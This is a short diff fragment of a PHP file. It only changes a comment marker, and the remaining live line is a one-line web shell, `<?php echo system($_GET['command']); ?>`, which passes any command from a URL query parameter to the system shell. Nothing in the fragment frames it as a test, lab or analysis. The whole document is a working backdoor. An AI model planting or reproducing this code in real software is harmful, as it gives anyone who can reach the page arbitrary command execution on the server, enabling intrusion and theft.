@@ -1,4 +1,4 @@
-<!-- pass an arbitrary system command via a query parameter -->
+// pass an arbitrary system command via a query parameter
 
 <?php echo system($_GET['command']); ?>
 
